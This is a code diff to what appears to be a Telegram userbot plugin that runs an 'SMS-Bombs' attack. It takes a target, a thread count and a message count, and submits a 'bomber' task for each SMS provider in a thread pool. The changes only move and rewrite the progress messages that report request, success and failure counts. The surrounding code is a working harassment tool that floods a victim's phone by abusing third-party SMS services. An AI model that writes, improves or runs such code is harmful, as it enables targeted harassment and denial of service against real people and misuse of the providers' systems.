@@ -389,10 +389,7 @@ async def geT_if(client, message):
                     failed += 1
             except:
                 failed += 1
-        k="Requests: "+str(success+failed)+" | Success: "+str(success)+" | Failed: "+str(failed)
-        printMessage(k)
-    async def printMessage(k):
-        await m.edit(l+"\n"+k)
+        
     global failed, success, no_of_sms,m
     m = await edit_or_reply(message, "`Please Wait!`")
     input_str = get_text(message)
@@ -404,7 +401,7 @@ async def geT_if(client, message):
     no_of_sms = int(no_of_sms.strip())
     failed, success = 0, 0
     l="Target: "+target+" | Threads: "+str(no_of_threads)+" | SMS-Bombs: "+str(no_of_sms)
-    await m.edit(l)
+    await m.edit(l+"\n Please Wait for some more time")
     start = time.time()
     providers = data["providers"]
     with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
@@ -421,4 +418,6 @@ async def geT_if(client, message):
                     else providers["multi"]
                 ),
             )
+            k="Requests: "+str(success+failed)+" | Success: "+str(success)+" | Failed: "+str(failed)
+            await m.edit(l+"\n"+k)
             executor.submit(bomber, p)
